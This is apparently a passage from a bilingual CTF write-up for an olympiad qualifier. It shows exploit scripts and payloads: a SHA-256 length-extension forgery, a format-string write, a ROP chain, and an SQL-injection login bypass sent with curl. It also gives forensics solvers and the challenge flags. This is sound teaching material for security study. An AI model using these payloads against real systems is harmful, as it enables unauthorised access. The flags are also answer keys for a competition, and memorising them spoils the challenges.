token0 = "e5e16bd00e210a057d9a0fc98d92b8b52ffad64c92b4ca3cd6fc15648011594a"

for secret_len in range(64):
    total_len = secret_len + len(data0)
    new_token, glue = s.extend(token0, total_len, b"&level=admin")
    forged_data = (data0 + glue + b"&level=admin").hex()
    # try submitting forged_data + new_token to the service here.
    # the real server doesn't tell you the secret length up front -
    # you just try each guess until the server accepts one.
```

In a real attack you don't get to peek at the correct answer - you loop over plausible secret lengths, forge a token for each, and let the *server itself* tell you which one it accepts. I already knew from the padding shape (above) that the answer was `secret_len = 18`, and confirmed it: plugging that into the loop produces the forged data and token exactly matching what's shown above, byte for byte.

### Final command

```bash
printf "S 757365723d6775657374266c6576656c3d6261736963800000000000000000000000000000000000000000000140266c6576656c3d61646d696e a97ae0b7c03ac5a0ec752a0c710e8a71354f2386306b5824210a06cd1903ce20\n" | nc 94.131.84.228 33006
```

Explanation:

| Part | Meaning |
|---|---|
| `printf` | Sends exactly one line, with an explicit `\n` at the end so I control precisely what gets transmitted. |
| `S` | The submit command this particular service expects. |
| first hex value | The forged data: original message + glue padding + `&level=admin`. |
| second hex value | The forged SHA-256 token that matches that forged data. |
| `\n` | Newline, so the server actually processes the line instead of waiting for more input. |
| `nc ... 33006` | Netcat, connecting straight to the challenge's TCP port. |

The service accepted the forged admin pass and handed back the VIP Club flag.

### Flag

Not gonna lie - I never actually wrote this one down. Got the forged admin pass accepted, saw the success message, moved straight on to the next task, and only realized I'd lost the flag text when writing this up afterward. The exploit itself is fully documented and reproducible above; the flag string alone just didn't make it into my notes. Classic.

---

## 9. Journal Operator

### Challenge

![Task Description](/ico_qualifying_round/tasks/journal_operator.webp)

```text
The program keeps a transaction log. Regular users are not allowed to use it - the service itself informs them of this upon login.
nc 94.131.84.228 33102
```

**Challenge file:** `journal_operator.bin`, in the [shared Drive folder](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW) - download it and `chmod +x` it first if you want to run it locally like I did below.

This was a pwn task built around a format-string bug.

The unsafe C pattern that causes this class of bug:

```c
printf(user_input);
```

versus the safe version:

```c
printf("%s", user_input);
```

The difference matters a lot: in the unsafe version, whatever *I* type is treated as the format string itself, not just as data. That means my input can contain format specifiers like `%p` (print a pointer), `%x` (print hex), `%s` (print a string) - and `%n`, which is the dangerous one, because instead of *printing* anything, it *writes* the number of characters printed so far into a memory address that I control.

Target variable, straight from the binary:

```text
is_admin = 0x40407c
```

The goal: get a `1` written into that exact address.

### Finding the offset

Before you can write anywhere, you need to know *where in the format string* your own input actually starts - printf reads its arguments off the stack in order, so "my input" is sitting at some specific position among all those `%p`s. Since I had the actual binary, I could just run it locally and probe directly instead of guessing blind:

```bash
printf '%p.%p.%p.%p.%p.%p.%p.%p\n' | ./journal_operator.bin
```

Real output from running that:

```text
=== ЖУРНАЛ ОПЕРАТОРА ===
Эта запись попадёт прямо в лог. Обычным пользователям сюда нельзя.
is_admin = 0
> Записано в лог: 0x7ffeacc8df20.(nil).(nil).(nil).0x1c.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70
```

Position 6 is the interesting one: `0x70252e70252e7025`. Split that into bytes and read it as ASCII (little-endian, so the *last* byte printed is actually the *first* byte in memory): `25 70 2e 25 70 2e 25 70` → `%p.%p.%p` - that's literally my own probe string, staring back at me from the stack. That's the confirmation: position 6 is exactly where my controlled input begins. Hence `fmtstr_payload(6, ...)` in the exploit below.

### Exploit

```python
from pwn import *

context.arch = "amd64"

HOST = "94.131.84.228"
PORT = 33102
IS_ADMIN = 0x40407c

io = remote(HOST, PORT)
io.recvuntil(b"> ")

payload = fmtstr_payload(6, {IS_ADMIN: 1}, write_size="byte")
print(payload.hex())

io.sendline(payload)
io.interactive()
```

Explanation:

| Line | Meaning |
|---|---|
| `context.arch = "amd64"` | Tells pwntools the target is 64-bit x86, so it builds pointers and payloads at the right width. |
| `remote(HOST, PORT)` | Opens a TCP connection to the challenge service. |
| `recvuntil(b"> ")` | Waits until the input prompt shows up before sending anything. |
| `fmtstr_payload(...)` | pwntools builds the whole format-string exploit payload for you - figuring out the right mix of `%c`/`%n`-style specifiers to land the exact byte value at the exact address, instead of me hand-crafting it. |
| `6` | The stack offset found above - where my controlled input sits among printf's arguments. |
| `{IS_ADMIN: 1}` | "Write the value `1` to address `0x40407c`." |
| `write_size="byte"` | Only write a single byte, not a full 4 or 8 - plenty, since `is_admin` is just a boolean-ish flag. |

Output:

```text
is_admin = 1
Доступ администратора подтверждён. ICO{str1pp3d_but_st1ll_wr1t3abl3}
```

### Flag

```text
ICO{str1pp3d_but_st1ll_wr1t3abl3}
```

---

## 10. AEZAKMI

### Challenge

![Task Description](/ico_qualifying_round/tasks/aezakmi.webp)

```text
An old arcade machine is asking for a name for its high score table.
nc 94.131.84.228 33101
```

**Challenge file:** `aezakmi.bin`, in the [shared Drive folder](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW) - download it and `chmod +x` it to run it locally.

Run it and you get a little banner:

```text
=== RETRO ARCADE ===
Введите имя для таблицы рекордов:
```

("Enter a name for the high score table" - enter a normal name and it just laughs it off with "Cheat codes aren't supported in this version, see you!")

This was a stack buffer overflow with a small ROP (Return-Oriented Programming) chain.

`AEZAKMI` is itself a reference - it's the classic GTA "give me everything" cheat code. Fitting, since the binary checks input against a hardcoded magic value:

```text
0x1337c0de
```

On Linux x86-64, the first argument to any function is passed in the `rdi` register (that's just the calling convention - the agreed-upon rulebook for how arguments get passed around at the machine-code level). So if the hidden win function looks roughly like:

```c
void win(long code) {
    if (code == 0x1337c0de) {
        print_flag();
    }
}
```

...then beating it means making the program call:

```text
win(0x1337c0de)
```

Which, in register terms, means landing on:

```text
rdi = 0x1337c0de
rip = win
```

(`rip` is the instruction pointer - where the CPU executes next. Controlling it is the entire game in a ROP exploit.)

### Values

```text
OFFSET = 0x48
POP_RDI = 0x401306
RET = 0x401307
WIN = 0x40123d
MAGIC = 0x1337c0de
```

I pulled these straight out of the binary with `objdump -d aezakmi.bin`. Worth noting: `POP_RDI` (`0x401306`) and `RET` (`0x401307`) are literally back-to-back bytes in the binary - `pop rdi` immediately followed by `ret` - meaning they're actually one single gadget (`pop rdi; ret`), not two unrelated ones that happen to be used together.

### Exploit

```python
from pwn import *

HOST = "94.131.84.228"
PORT = 33101

OFFSET = 0x48
POP_RDI = 0x401306
RET = 0x401307
WIN = 0x40123d
MAGIC = 0x1337c0de

payload = b"A" * OFFSET
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(MAGIC)
payload += p64(WIN)

io = remote(HOST, PORT)
io.recvuntil("Введите имя".encode())
io.sendline(payload)
io.interactive()
```

Payload layout, back to front:

```text
'A' * 0x48
RET
POP_RDI
0x1337c0de
WIN
```

What actually happens when this lands:

1. `b"A" * 0x48` is filler - junk bytes that walk the overflow exactly up to the saved return address on the stack, without touching anything I need to preserve.
2. The first address the function returns into is `RET` (`0x401307`, a bare `ret` instruction) - that's a stack-alignment trick. It doesn't do anything meaningful itself, it just pops the *next* value and jumps there, nudging the stack pointer onto the 16-byte alignment some libc internals expect before a real call.
3. That lands on `POP_RDI` (`0x401306`), which pops the next stack value straight into the `rdi` register - that next value is `MAGIC` (`0x1337c0de`), so now `rdi` holds exactly what `win()` wants to see.
4. `POP_RDI`'s own trailing `ret` (which, remember, *is* `0x401307` - same byte, same gadget) then pops the final value, `WIN`, and jumps to it.
5. `win()` runs with `rdi = 0x1337c0de`, the magic check passes, and it prints the flag.

Output:

```text
Верный чит-код! ICO{n0_symb0ls_st1ll_p0pp3d_rd1}
```

("Correct cheat code!")

### Flag

```text
ICO{n0_symb0ls_st1ll_p0pp3d_rd1}
```

<p align="center"><a href="#ico-2027-qualifications-ctf-writeups">Back to top</a></p>

---

<a id="russian"></a>

# Русский

Пишу этот райтап так, как реально всё решала: что заметила первым, что натолкнуло на мысль, какие тулзы использовала и почему конкретный трюк вообще сработал. Не причёсанная версия "тут всё очевидно", а реальный процесс, вместе со всеми шероховатостями.

## 0. Контекст и словарь

`ICO` расшифровывается как `International Cybersecurity Olympiad` - Международная олимпиада по кибербезопасности для школьников. Отборочный этап Казахстана проходил в формате `CTF - Jeopardy`.

`CTF` значит `Capture The Flag`, то есть "захвати флаг". В CTF флаг - это секретная строка внутри задания: нашла - сдала - получила баллы.

Формат флагов был примерно такой:

```text
ICO{something_here}
ico{something_here}
```

`Jeopardy-style CTF` значит, что перед тобой доска с кучей отдельных заданий по разным категориям (как в телеигре Jeopardy), и берёшь любое, какое хочешь. Каждое задание даёт баллы и один или несколько флагов.

| Категория | Что значит | Объяснение |
|---|---|---|
| Web | Веб-безопасность | Сайты, формы логина, API, cookies, WordPress, проблемы с авторизацией. |
| Crypto | Криптография | Слабые хеши, подписи, генераторы случайных чисел, шифрование. |
| Reverse / Rev | Реверс-инжиниринг | Понять, что делает программа, не имея её исходного кода. |
| Forensics | Форензика | Файлы, картинки, аудио, метаданные, PCAP, скрытые данные. |
| Pwn | Эксплуатация бинарников | Ломаем скомпилированные программы, обычно через баги с памятью. |

Термины, которые постоянно использовала:

| Термин | Объяснение |
|---|---|
| API | Интерфейс, через который программы общаются друг с другом. |
| JSON | Текстовый формат данных, например `{"ok":true}`. |
| SQL | Язык запросов к базе данных. |
| SQLi | SQL-инъекция. Баг, когда мой ввод меняет сам SQL-запрос. |
| RCE | Remote Code Execution. Возможность выполнить команду на чужом сервере. |
| PRNG | Псевдослучайный генератор. Выглядит случайным, но на деле работает по формуле. |
| LCG | Linear Congruential Generator. Простой PRNG с формулой `x[n+1] = (a*x[n] + c) mod m`. |
| EXIF | Метаданные внутри фото: GPS, камера, время съёмки, комментарии. |
| PCAP | Файл с сохранённым сетевым трафиком. |
| ROP | Return-Oriented Programming. Цепочка из маленьких кусочков кода, которые уже лежат внутри бинарника. |
| MAC | Подпись/тег, подтверждающий, что сообщение не подделали. |
| SHA-256 | Хеш-алгоритм: на входе что угодно, на выходе 256 бит (64 hex-символа) - как отпечаток пальца для данных. |
| HMAC | Схема хеширования, специально устроенная так, чтобы не ломаться от атаки удлинением (в отличие от простого `sha256(secret + message)`). |
| ELF | Executable and Linkable Format - стандартный формат скомпилированных программ под Linux. Если тебе дают `.bin` файл на Linux-таске, почти всегда внутри именно это. |
| `objdump` | Тулза, которая дизассемблирует бинарник обратно в (более-менее) читаемый ассемблер, чтобы понять, что он делает на уровне процессора. |
| `chmod +x` | Команда в Linux, которая помечает файл как "можно запускать". У скачанных бинарников этого флага обычно нет по умолчанию - надо ставить самой. |

Инструменты, которые использовала:

| Инструмент | Зачем |
|---|---|
| `file` | Узнать настоящий тип файла по магическим байтам, а не по расширению. |
| `strings` | Достать читаемый текст из файла или бинарника. |
| `xxd` / `od` | Посмотреть сырые байты в hex, чтобы разглядеть заголовки и структуру. |
| `base64` | Кодировать/декодировать Base64. |
| `curl` | Отправлять точные, скриптуемые HTTP-запросы. |
| DevTools браузера | Смотреть HTML, JS, cookies и сетевые запросы. |
| `nc` | Netcat, подключение к сырым TCP-сервисам. |
| Python | Автоматизация, математика, декодирование, эксплойты. |
| pwntools | Python-библиотека специально под pwn-задачи. |
| `tshark` / Wireshark | Читать и фильтровать PCAP-трафик. |
| `zsteg` | Искать данные, спрятанные в битовых плоскостях картинки. |
| Ghidra / `objdump` | Реверс скомпилированных бинарников. |

## Итоги

| # | Задача | Категория | Результат |
|---:|---|---|---|
| 1 | Rev Zero | Reverse | `ico{R3v3R$3_fR0m_Z3r0}` |
| 2 | Wolf Protocol | Reverse | `ico{w0lves_see_th3_h1dd3n_truth_42}` |
| 3 | Can you hear the flag? | Forensics | `ico{a7f3c91e2b6d48f5c0a19d83e72b4f61}` |
| 4 | Five Shards | Forensics | `ico{5h4rd5_4r3_b3tt3r_t0g3th3r!}` |
| 5 | NorthStar | Web | `ico{721427dd34030ef0c0458d1e5067395e}` |
| 6 | Backdoor | Web / WordPress | `ico{7519ee9f05a6a11ca96cc044c971b6ae}` |
| 7 | PixelMart | Crypto / PRNG | `ICO{f1gur3_1t_0ut_y0urs3lf_th3n_3xpl0it}` |
| 8 | VIP Club | Crypto | забыла записать, см. ниже |
| 9 | Journal Operator | Pwn | `ICO{str1pp3d_but_st1ll_wr1t3abl3}` |
| 10 | AEZAKMI | Pwn | `ICO{n0_symb0ls_st1ll_p0pp3d_rd1}` |

В Backdoor заодно наткнулась на дополнительный environment-флаг:

```text
ico{258da6df9fcf12cf110d42dd77d7937f}
```

---

## 1. Rev Zero

### Условие

![Task Description](/ico_qualifying_round/tasks/rev_zero.webp)

```text
The terminal is locked. The code is right in front of you.
```

**Файл задания:** `rev_zero.html`, лежит в [общей папке на Drive](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW) вместе с файлами всех остальных задач.

Это reverse-задача, и прикол тут почти смешной: вся проверка лежит прямым текстом в JavaScript. Если браузер может скачать код - значит, и я могу его прочитать. "Скрытая" логика, которая уезжает прямо на клиент, на самом деле никакая не скрытая.

### Что я нашла

Открыла страницу, глянула в исходники, и вот что там прямо лежало:

```javascript
if (btoa(input.split('').reverse().join('')) === 'fTByM1pfbTBSZl8zJFIzdjNSe29jaQ==') {
    // correct
}
```

Разбор по символам, потому что тут каждая часть что-то делает:

| Код | Что делает |
|---|---|
| `input.split('')` | Делит мой ввод на массив отдельных символов. |
| `.reverse()` | Переворачивает порядок этого массива. |
| `.join('')` | Склеивает массив обратно в строку. |
| `btoa(...)` | Кодирует строку в Base64 (`btoa` = "binary to ASCII", встроенная функция браузера). |
| `===` | Строгое сравнение с захардкоженной строкой. |

То есть логика приложения целиком такая:

```text
input -> reverse -> Base64 -> compare
```

Чтобы решить, просто прогоняю это в обратном порядке:

```text
захардкоженный Base64 -> decode -> reverse
```

### Решение руками

```bash
echo 'fTByM1pfbTBSZl8zJFIzdjNSe29jaQ==' | base64 -d
```

Вывод:

```text
}0r3Z_m0Rf_3$R3v3R{oci
```

Это же явно флаг задом наперёд - `}` в начале и `{oci` в конце сразу выдают. Переворачиваю:

```text
ico{R3v3R$3_fR0m_Z3r0}
```

### Python-решение

```python
import base64

encoded = "fTByM1pfbTBSZl8zJFIzdjNSe29jaQ=="
decoded = base64.b64decode(encoded).decode()
flag = decoded[::-1]
print(flag)
```

Разбор:

| Строка | Объяснение |
|---|---|
| `import base64` | Подключает модуль для работы с Base64. |
| `encoded = ...` | Сохраняю захардкоженное значение прямо из JS. |
| `base64.b64decode(encoded)` | Декодирует Base64 обратно в сырые байты. |
| `.decode()` | Превращает байты в обычную текстовую строку. |
| `[::-1]` | Питоновский трюк со срезами - переворачивает строку (шаг `-1` идёт задом наперёд). |
| `print(flag)` | Печатает флаг. |

### Флаг

```text
ico{R3v3R$3_fR0m_Z3r0}
```

---

## 2. Wolf Protocol

### Условие

![Task Description](/ico_qualifying_round/tasks/wolf_protocol.webp)

```text
The binary speaks only one language. Are you fluent?
```

**Файл задания:** `wolf_protocol.bin`, лежит в [общей папке на Drive](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW) - после скачивания не забудь `chmod +x`, если решишь запускать локально.

Это reverse-задача с бинарником. `Бинарник` - просто скомпилированная программа, поэтому вместо чтения чистого исходного кода пришлось восстанавливать алгоритм по тому, что программа реально делает.

### Идея

Бинарник прогонял каждый байт флага через три обратимых шага:

1. Замена по S-box.
2. XOR с байтом ключа.
3. Rotate left (циклический сдвиг влево).

`S-box` - это просто таблица замены: байт X меняется на байт Y по фиксированной таблице. `XOR` обратим, потому что `x ^ k ^ k = x` (XOR с одним и тем же ключом дважды отменяет сам себя). А любой rotate left отменяется соответствующим rotate right. Все три шага выглядят необратимыми, но на деле полностью обратимы, если знаешь ключевые материалы - в этом весь смысл реверса.

### Константы, которые я восстановила

```python
MULTIPLIER = 6364136223846793005
INCREMENT = 1442695040888963407
MASK64 = (1 << 64) - 1

SBOX_SEED = 0xDEADBEEF13370042
KEY_SEED = 0xBEEFCAFE0BADF00D

TARGET = bytes([
    32, 79, 206, 17, 115, 221, 115, 78, 80, 114, 43, 141,
    201, 26, 244, 130, 98, 168, 126, 73, 184, 202, 206,
    66, 111, 100, 174, 217, 170, 90, 69, 160, 184, 66, 192,
])
```

Маленькая деталь: `MULTIPLIER` и `INCREMENT` - это не случайно придуманные числа, а ровно та пара констант из известного 64-битного LCG Кнута (MMIX generator) - те же самые константы встречаются и в PRNG-генераторах семейства PCG. А `SBOX_SEED`, `KEY_SEED` и константа `0x1337c0de` из AEZAKMI дальше - классические "leet speak" магические числа хакерской культуры (`DEADBEEF`, `BEEFCAFE`, `BADF00D`) - просто подпись автора задания для красоты, без особого функционального смысла.

Проверка внутри бинарника была эквивалентна:

```text
cipher_byte = rol8(sbox[plain_byte] ^ key_byte, rotation)
```

Поэтому, чтобы отменить, прогоняю всё в обратном порядке:

```text
plain_byte = inverse_sbox[ror8(cipher_byte, rotation) ^ key_byte]
```

### Solver

```python
MULTIPLIER = 6364136223846793005
INCREMENT = 1442695040888963407
MASK64 = (1 << 64) - 1

SBOX_SEED = 0xDEADBEEF13370042
KEY_SEED = 0xBEEFCAFE0BADF00D

TARGET = bytes([
    32, 79, 206, 17, 115, 221, 115, 78, 80, 114, 43, 141,
    201, 26, 244, 130, 98, 168, 126, 73, 184, 202, 206,
    66, 111, 100, 174, 217, 170, 90, 69, 160, 184, 66, 192,
])


def lcg_next(state):
    return (state * MULTIPLIER + INCREMENT) & MASK64


def ror8(value, amount):
    amount &= 7
    return ((value >> amount) | (value << (8 - amount))) & 0xff


def build_sbox():
    sbox = list(range(256))
    state = SBOX_SEED
    for i in range(255, 0, -1):
        state = lcg_next(state)
        j = state % (i + 1)
        sbox[i], sbox[j] = sbox[j], sbox[i]
    return sbox


def build_key(length):
    state = KEY_SEED
    key = []
    for _ in range(length):
        state = lcg_next(state)
        key.append((state >> 24) & 0xff)
    return key


sbox = build_sbox()
inverse_sbox = [0] * 256
for original, substituted in enumerate(sbox):
    inverse_sbox[substituted] = original

key = build_key(len(TARGET))
flag = []

for i, target_byte in enumerate(TARGET):
    rotation = (i % 7) + 1
    byte = ror8(target_byte, rotation) ^ key[i]
    flag.append(inverse_sbox[byte])

print(bytes(flag).decode())
```

Важные строки:

| Строка | Значение |
|---|---|
| `lcg_next` | Воссоздаёт тот же псевдослучайный генератор, что и внутри бинарника, шаг в шаг. |
| `build_sbox()` | Восстанавливает ту же перемешанную таблицу замен. Это Fisher-Yates шафл: берём `[0, 1, ..., 255]` по порядку и идём с конца (с индекса 255) к началу, на каждом шаге меняя текущий элемент местами со случайным (но всегда более ранним или тем же) индексом. `j = state % (i + 1)` гарантирует, что `j` всегда попадает в ещё не перемешанную часть. Из-за того, что генератор детерминированный (тот же seed), получается один и тот же "случайный" шафл каждый раз. |
| `build_key()` | Восстанавливает тот же поток ключа, байт за байтом, из того же seed. |
| `inverse_sbox` | Перевёрнутая таблица замен: если `sbox[5] = 200`, то `inverse_sbox[200] = 5` - позволяет отменить замену. |
| `ror8(...) ^ key[i]` | Отменяет rotate left (через rotate right) и XOR (повторным XOR с тем же байтом ключа), в правильном обратном порядке. |

### Флаг

```text
ico{w0lves_see_th3_h1dd3n_truth_42}
```

---

## 3. Can you hear the flag?

### Условие

![Task Description](/ico_qualifying_round/tasks/can_you_hear_the_flag.webp)

```text
Just a picture. Nothing to see here.
```

**Файл задания:** `challenge.png`, лежит в [общей папке на Drive](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW).

Название говорит "hear" (услышать), а описание - "picture" (картинка). Это несовпадение и есть подсказка, автор задания буквально подмигивает. Так что я перестала считать картинку просто картинкой и начала относиться к ней как к контейнеру, в котором может лежать что-то совсем другое.

Это форензика/стеганография. `Steganography` значит прятать данные внутри другого, на вид совершенно не связанного файла.

### Шаги

Сначала проверяю, чем файл реально является, а не что написано в расширении:

```bash
file challenge.png
```

Потом ищу читаемые подсказки внутри:

```bash
strings -a challenge.png | grep -iE 'ico|flag|ctf|wav|sound|audio|hint'
```

Потом проверяю, не спрятано ли что-то внутри самого файла:

```bash
binwalk challenge.png
binwalk -e challenge.png
```

`binwalk` ищет сигнатуры известных форматов файлов внутри другого файла - по сути "не приклеен ли сюда тайно второй файл". Если после данных картинки был приклеен WAV-файл, это именно то, что покажет `binwalk`.

После извлечения скрытого аудио я сделала из него спектрограмму, чтобы реально посмотреть на звук:

```bash
ffmpeg -i hidden.wav -lavfi showspectrumpic=s=1600x900 spectrogram.png
```

Или через `sox`:

```bash
sox hidden.wav -n spectrogram -o spectrogram.png
```

`Spectrogram` - это буквально картинка звука:

| Направление | Значение |
|---|---|
| слева направо | время |
| снизу вверх | частота |
| яркость/цвет | громкость/интенсивность |

Текст или картинки часто прячут именно в аудио, потому что на спектрограмме это видно сразу - и действительно, флаг был нарисован прямо в частотных данных.

### Флаг

```text
ico{a7f3c91e2b6d48f5c0a19d83e72b4f61}
```

---

## 4. Five Shards

### Условие

![Task Description](/ico_qualifying_round/tasks/five_shards.webp)

```text
The flag was shattered across five files. Each shard is a piece of a larger puzzle - but not every file is what it seems, and not every secret is obvious.
Find them all. Put them together.
```

**Файлы задания:** все пять файлов ниже лежат в [общей папке на Drive](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW), под теми же именами.

Файлы в папке:

```text
corrupted.wav
noise.png
photo.jpg
readme.txt
traffic.pcap
```

"Пять осколков" в названии, пять файлов в папке - значит, шаг первый: проверить каждый файл отдельно и не доверять ни одному расширению.

### Шаг 1 - типы файлов

```bash
file corrupted.wav noise.png photo.jpg readme.txt traffic.pcap
```

Важный результат:

```text
corrupted.wav: compiled Java class data
noise.png: PNG image data, 800 x 400, 8-bit/color RGB
photo.jpg: JPEG image data, Exif metadata
readme.txt: ASCII text
traffic.pcap: pcap capture file
```

`corrupted.wav` сразу показался подозрительным - нормальный WAV-файл всегда начинается с байтов `RIFF`, а не с того, из-за чего `file` решил, что это Java class.

### Шаг 2 - README

В README лежал большой Base64-блок:

```bash
echo 'Tm90aGluZyB0byBzZWUgaGVyZS4gVGhpcyBpcyBhIHJlZCBoZXJyaW5nLgpUaGUgZmxhZyBpcyBub3QgaW4gdGhpcyBmaWxlLgpIaW50OiBmaXZlIGZpbGVzLCBmaXZlIHNoYXJkcywgb25lIHRydXRoLg==' | base64 -d
```

Вывод:

```text
Nothing to see here. This is a red herring.
The flag is not in this file.
Hint: five files, five shards, one truth.
```

`Red herring` - это намеренная ложная подсказка, но даже она подтвердила структуру: 5 файлов, 5 кусочков.

### Шаг 3 - чиним WAV

Посмотрела сырые байты заголовка:

```bash
xxd -l 32 corrupted.wav
```

(`-l 32` значит "покажи только первые 32 байта", нет смысла выгружать весь файл целиком.)

Первые байты:

```text
ca fe ba be de ad c0 de 52 49 46 46 34 b1 02 00
57 41 56 45 66 6d 74 20
```

По группам байт:

| Байты | Значение |
|---|---|
| `ca fe ba be` | Магические байты Java class файла (`CAFEBABE` - да, это настоящее официальное магическое число Java). Именно из-за этого `file` и подумал, что это Java class. |
| `de ad c0 de` | Ещё один классический hex-жаргонный "мусорный" маркер (`DEADCODE`), просто чтобы дополнительно запутать определение типа файла. |
| `52 49 46 46` | ASCII `RIFF` - настоящее начало WAV-файла, зарытое на 8 байт глубже. |
| `57 41 56 45` | ASCII `WAVE`, подтверждает догадку. |

Так что решение - просто отрезать первые 8 поддельных байт:

```bash
tail -c +9 corrupted.wav > fixed.wav
file fixed.wav
```

`tail -c +9` значит "начни вывод с байта номер 9". Байты 1-8 были поддельным заголовком `CAFEBABE DEADCODE`, а byte 9 - это ровно то место, где начинается настоящий `RIFF`.

### Шаг 4 - метаданные фото

```bash
exiftool photo.jpg
```

Важные подсказки в полях EXIF:

```text
The 13th step reveals the truth
Somewhere high in the Caucasus
GPS: 43°20'59.640"N, 42°26'43.080"E
Altitude: 5642m
```

Эти координаты и высота 5642 м указывают прямо на Эльбрус. А "13th step" - довольно прямой намёк на `ROT13`.

`ROT13` сдвигает каждую букву на 13 позиций по алфавиту. Забавное свойство: применить его дважды подряд - и получаешь обратно исходный текст, потому что в алфавите 26 букв (13 + 13 = 26 = полный круг).

```python
import codecs
print(codecs.decode("vpb", "rot_13"))
```

Вывод:

```text
ico
```

### Шаг 5 - PCAP, DNS-осколок

```bash
tshark -r traffic.pcap -Y dns -T fields -e dns.qry.name | sort -u
```

(`-r` читает файл захвата, `-Y dns` фильтрует только DNS-трафик, `-T fields -e dns.qry.name` печатает только запрошенное доменное имя из каждого пакета.)

DNS-запросы содержали пронумерованные по порядку куски:

```text
000-UOO5LRPL.shard4.ctf
001-YX2KZLWL.shard4.ctf
002-4WFKZHU7.shard4.ctf
003-XT4YVTUN.shard4.ctf
004-VTZLJ3VN.shard4.ctf
005-ZXHNN3O7.shard4.ctf
006-4GRQ====.shard4.ctf
```

Это классический паттерн DNS-эксфильтрации - прятать данные (в данном случае кусок пазла) в виде последовательности поддельных поддоменов. Я убрала номера и суффикс `.shard4.ctf`, а оставшиеся метки склеила по порядку:

```text
UOO5LRPLYX2KZLWL4WFKZHU7XT4YVTUNVTZLJ3VNZXHNN3O74GRQ====
```

Эта строка вместе с паддингом - Base32:

```python
import base64

s = "UOO5LRPLYX2KZLWL4WFKZHU7XT4YVTUNVTZLJ3VNZXHNN3O74GRQ===="
raw = base64.b32decode(s)
print(raw.hex())
```

Вывод:

```text
a39dd5c5ebc5f4acaecbe58aac9e9fbcf98ace8dacf2b4eeadcdced6eddfe1a3
```

### Шаг 6 - noise.png

Запустила `zsteg`, которая ищет скрытые данные конкретно в битовых плоскостях картинки:

```bash
zsteg -a noise.png
```

Среди кучи вывода реальная зацепка была тут:

```text
b4,g,lsb,xy .. file: zlib compressed data
```

Разбор:

| Часть | Значение |
|---|---|
| `b4` | битовая плоскость 4 (5-й бит от младшего в каждом байте) |
| `g` | зелёный канал цвета |
| `lsb` | порядок от младшего бита |
| `xy` | пиксели читаются слева направо, потом сверху вниз |
| `zlib` | а спрятаны там zlib-сжатые данные |

Извлекла эту битовую плоскость и распаковала, что там лежало:

```bash
zsteg -E b4,g,lsb,xy noise.png > noise_shard.zlib
python3 - <<'PY'
import zlib
raw = open("noise_shard.zlib", "rb").read()
print(zlib.decompress(raw))
PY
```

После сборки всех пяти осколков и применения подсказок из каждого шага получился флаг:

```text
ico{5h4rd5_4r3_b3tt3r_t0g3th3r!}
```

---

## 5. NorthStar

### Условие

![Task Description](/ico_qualifying_round/tasks/northstar.webp)

```text
For years, Northstar Systems guided critical deployments across the globe. After a sudden breach locked the operations center, the company's internal portal was taken offline. Rumors suggest the attackers left two flags behind: one buried in the authentication system, and another hidden within the deployment infrastructure.
https://task1.cyberolympiad.kz
```

Живая веб-задача - никаких файлов, просто URL. Фраза "authentication system" сразу указала на форму логина.

### SQL injection

Payload, который сработал:

```text
username=' OR 1=1-- -
password=x
```

Уязвимый запрос за кулисами, скорее всего, выглядит примерно так:

```sql
SELECT * FROM users
WHERE username = '$username'
AND password = '$password';
```

Подставляем мой ввод как есть, без экранирования, и получаем:

```sql
SELECT * FROM users
WHERE username = '' OR 1=1-- -'
AND password = 'x';
```

По символам:

| Часть | Значение |
|---|---|
| `'` | закрывает кавычку, которую открыл оригинальный запрос для `$username` |
| `OR 1=1` | условие, которое всегда истинно, поэтому `WHERE` совпадает с любой строкой таблицы, независимо от реального логина/пароля |
| `-- -` | однострочный комментарий в SQL - всё после него (включая проверку пароля) просто отбрасывается и никогда не выполняется |

### Проверка через curl

```bash
BASE='https://task1.cyberolympiad.kz'

curl -sk -i -X POST "$BASE/login" \
  --data-urlencode "username=' OR 1=1-- -" \
  --data-urlencode "password=x"
```

Значения флагов - они ещё много раз встретятся дальше по райтапу:

| Флаг | Значение |
|---|---|
| `-s` | silent - не показывать прогресс-бар |
| `-k` | пропустить проверку TLS-сертификата (нормально для CTF, там часто самоподписанные сертификаты) |
| `-i` | включить заголовки ответа в вывод, а не только тело |
| `-X POST` | явно отправить как HTTP POST-запрос |
| `--data-urlencode "field=value"` | отправляет `field=value` как form data, безопасно URL-кодируя, чтобы спецсимволы вроде `'` выше не сломали сам запрос |

После обхода логина сразу попала на дашборд, флаг был там же.

### Флаг

```text
ico{721427dd34030ef0c0458d1e5067395e}
```

---

## 6. Backdoor

### Условие

![Task Description](/ico_qualifying_round/tasks/backdoor.webp)

```text
Once a thriving community blog, this WordPress site was abandoned after its administrator vanished without a trace. The site remains online, filled with forgotten posts and an oddly persistent plugin installed by the last person to access the dashboard.
Explore the site, uncover its weaknesses, and find the flags hidden behind the administrator's account and on the system.
https://task2.cyberolympiad.kz
```

Ещё одна живая веб-задача, на этот раз WordPress. `WordPress` - это CMS (Content Management System), на нём держится огромная часть блогов в интернете. `Plugin` - это просто дополнительный PHP-код, встроенный в WordPress. Фраза "oddly persistent plugin" и была подсказкой: искать кастомные REST-роуты и `mu-plugins` ("must-use plugins" - плагины, которые WordPress грузит принудительно на каждый запрос, их нельзя отключить из админки, отличное место, чтобы спрятать бэкдор).

### Перебор REST API

```bash
BASE='https://task2.cyberolympiad.kz'

curl -sk "$BASE/wp-json/" | python3 -m json.tool
curl -sk "$BASE/wp-json/wp/v2/users" | python3 -m json.tool
```

(`python3 -m json.tool` просто красиво форматирует JSON-ответ вместо одной нечитаемой строки.)

Корень `/wp-json/` перечисляет все зарегистрированные API-неймспейсы сайта, включая те, что добавили сами плагины, а `/wp-json/wp/v2/users` - это стандартный (часто случайно публично доступный) эндпоинт списка пользователей WordPress.

Нашла пользователя:

```text
sp3c1al
```

И в списке неймспейсов - кастомный роут, которому там явно не место:

```text
